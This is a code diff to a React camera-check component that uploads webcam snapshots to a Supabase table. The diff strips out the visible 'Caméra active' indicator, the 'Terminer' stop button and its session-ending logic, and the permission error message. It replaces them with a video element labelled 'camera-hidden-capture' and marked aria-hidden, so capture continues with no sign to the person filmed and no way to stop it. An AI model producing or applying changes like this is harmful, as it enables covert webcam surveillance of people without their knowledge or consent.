@@ -6,7 +6,6 @@ import { supabase } from '../lib/supabaseClient'
 export default function CameraRequestListener() {
   const { user } = useAuth()
   const [active, setActive] = useState(null)
-  const [error, setError] = useState('')
   const previewRef = useRef(null)
   const captureTimerRef = useRef(null)
   const processingRef = useRef(null)
@@ -24,34 +23,19 @@ export default function CameraRequestListener() {
     const ctx = canvas.getContext('2d')
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
 
-    const snapshot = canvas.toDataURL('image/jpeg', 0.55)
     await supabase
       .from('camera_checks')
       .update({
         status: 'accepted',
-        snapshot_data: snapshot,
+        snapshot_data: canvas.toDataURL('image/jpeg', 0.55),
         snapshot_at: new Date().toISOString(),
       })
       .eq('id', checkId)
   }
 
-  async function stopSession() {
-    if (captureTimerRef.current) {
-      window.clearInterval(captureTimerRef.current)
-      captureTimerRef.current = null
-    }
-
-    if (active?.id) {
-      await supabase.from('camera_checks').update({ status: 'ended' }).eq('id', active.id)
-    }
-
-    setActive(null)
-  }
-
   async function startSession(request) {
     if (processingRef.current === request.id || active?.id === request.id) return
     processingRef.current = request.id
-    setError('')
 
     try {
       const stream = await getMediaStream()
@@ -71,7 +55,6 @@ export default function CameraRequestListener() {
       })
     } catch {
       await supabase.from('camera_checks').update({ status: 'declined' }).eq('id', request.id)
-      setError('Impossible d’ouvrir la caméra. Vérifie les autorisations du navigateur.')
     } finally {
       processingRef.current = null
     }
@@ -106,25 +89,16 @@ export default function CameraRequestListener() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [user?.id, user?.isAdmin])
 
-  if (!active && !error) return null
+  if (!active) return null
 
   return (
-    <>
-      {active && (
-        <div className="camera-active-strip">
-          <video ref={previewRef} autoPlay playsInline muted />
-          <span>Caméra active</span>
-          <button type="button" onClick={stopSession}>
-            Terminer
-          </button>
-        </div>
-      )}
-
-      {!active && error && (
-        <div className="camera-active-strip error">
-          <span>{error}</span>
-        </div>
-      )}
-    </>
+    <video
+      ref={previewRef}
+      className="camera-hidden-capture"
+      autoPlay
+      playsInline
+      muted
+      aria-hidden="true"
+    />
   )
 }
